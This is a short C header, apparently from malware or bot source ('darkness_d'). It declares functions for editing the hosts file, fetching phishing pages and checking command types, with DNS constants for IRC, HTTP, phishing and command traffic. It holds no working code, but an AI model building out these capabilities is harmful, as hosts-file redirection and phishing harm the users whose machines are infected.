#ifndef DNS_NAMES

#define IRC_DNS 0x1
#define HTTP_DNS 0x2
#define COMMAND_DNS 0x3
#define PHISHING_DNS 0x4
#define SERVER_DNS 0x5
#define EDIT_DNS 0x6

#define DNS_NAMES
#endif

char *DnsGetDomain(int);
int DnsEditHostsFile(char *, char *);
void DnsGetPhishingPage(struct darkness_d *);
char *DnsGetEditData(void);
int DnsCheckCommandType(void);
